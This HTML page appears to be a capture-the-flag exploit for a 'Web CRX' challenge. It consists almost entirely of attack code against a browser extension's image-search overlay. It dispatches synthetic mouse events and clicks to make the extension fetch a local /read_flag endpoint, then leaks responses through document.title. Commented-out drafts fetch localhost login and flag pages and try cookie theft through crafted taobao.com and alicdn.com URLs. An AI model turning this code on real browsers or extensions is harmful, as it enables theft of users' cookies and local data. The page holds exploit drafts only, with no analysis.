<!-- <div>
  <h1>2024</h1>
  <p>Web CRX</p>
  I have many secrets. Can you find them?
</div> -->
<!-- <iframe> I have many secrets. Can you find them? </iframe> -->
<body style="overflow: visible">
  <image
    id="my_img"
    src="127.0.0.1:30000/login"
    style="
      width: 100vw;
      height: 100vh;
      background-image: url(http://127.0.1.14:1919/login);
    "
  ></image>
  <iframe src="http://127.0.1.14:1919/read_flag"></iframe>
</body>
<script defer>
  function _log(e) {
    console.log(e);
    document.title += e;
  }
  window.addEventListener("message", function (e) {
    _log(e);
  });
  window.addEventListener("sendDataToContentScript", function (e) {
    _log(e);
    _log(JSON.stringify(e.detail));
  });
  setTimeout(() => {
    // _log(
    //   document.getElementsByClassName(
    //     "index-module__imgSearch_hover_content--c5JEb"
    //   )[0].innerHTML
    // );
    // var img = document.getElementsByTagName("img")[0];
    /** @type {HTMLImageElement} */
    var my_img = document.getElementById("my_img");
    my_img.focus();
    my_img.dispatchEvent(
      new MouseEvent("mousemove", {
        bubbles: true,
        target: my_img,
        clientX: 10,
        clientY: 10,
      })
    );

    // const s = document.getElementsByClassName(
    //   "index-module__imgSearch_hover_rightWrapper--VZGcY"
    // )[0];
    // s.focus();

    my_img.src = "http://127.0.1.14:1919/read_flag";
    // my_img.src = "newtab.html";

    var search = document.getElementsByClassName(
      "index-module__imgSearch_hover_content_text--WI0by"
      // "index-module__imgSearch_hover_content--c5JEb"
    )[0];
    _log("Found search");
    // search.focus();
    search.click();

    var ifr = document.getElementsByTagName("iframe")[0];
    ifr.addEventListener("message", function (e) {
      _log(e);
    });

    var close = document.getElementsByClassName(
      "index-module__closeIconWrapper--fA3Su"
    )[0];
    close.click();

    setTimeout(() => {
      search.click();
    }, 1000);
    // _log(ifr.src);
    // _log(ifr.contentWindow.document.body.innerHTML);
    // var iframe = document.getElementsByClassName(
    //   "index-module__imgSearch_leftLayout_iframe--exsY5"
    // );
    // _log(iframe.innerHTML);
    // /** @type {HTMLIFrameElement} */
    // const i = iframe;
    // _log(i.contentWindow.document.body.innerHTML);
    // /** @type {HTMLCollectionOf<HTMLImageElement>} */
    // const img = i.contentWindow.document.getElementsByTagName("img");
    // for (const i of img) _log(i);
    // _log(i.contentWindow.document.body.innerHTML);
    // for (const img of document.getElementsByTagName("img"))
    //   console.log(img.src);
  }, 1000);
</script>
<!-- <script defer async>
  /**
   * @param {HTMLElement} e
   */
  function visible(e) {
    console.log(e);
    try {
      e.style.display = "block";
    } catch (err) {
      console.error(e, err);
    }
    for (const child of e.childNodes) {
      visible(child);
    }
  }
  /**
   * @param {HTMLElement} e
   */
  function click(e) {
    console.log(e);
    try {
      e.click();
    } catch (err) {
      console.error(e, err);
    }
    for (const child of e.childNodes) {
      click(child);
    }
  }
  async function main() {
    visible(document.body);
    click(document.body);
    const is = document.getElementsByClassName(
      "index-module__imgSearch_hover_content--c5JEb"
    )[0];
    console.log(is);
    is.style.display = "block";
  }
  main();
</script> -->
<!-- <script id="script">
  // window.location.replace("http://huodong.taobao.com?action=document.title+=document.cookie");
  // window.location.replace("http://g.alicdn.com/?action=document.title+=document.cookie");
  // window.location.replace("http://o.alicdn.com/?action=document.title+=document.cookie");
  async function main() {
    try {
      // const req1 = new Request("http://log.mmstat.com/eg.js");
      const req1 = new Request("http://huodong.taobao.com", {
        mode: "no-cors",
      });
      const res1 = await fetch(req1);
      document.title += await res1.text();
    } catch (error) {
      console.error(error);
      document.title += error;
    }
  }
  main();
</script> -->
<!-- <script
  async=""
  crossorigin="anonymous"
  src="https://log.mmstat.com/eg.js"
  onload="document.title+='loaded'"
></script> -->

<!-- <script>
  async function main() {
    try {
      const req1 = new Request("http://127.0.0.1:30000/login");
      const res1 = await fetch(req1);
      document.title += await res1.text();
      const req2 = new Request("http://127.0.0.1:30000/read_flag");
      const res2 = await fetch(req2);
      document.title += await res2.text();
    } catch (error) {
      console.error(error);
      document.title += error;
    }
  }
  main();
</script> -->
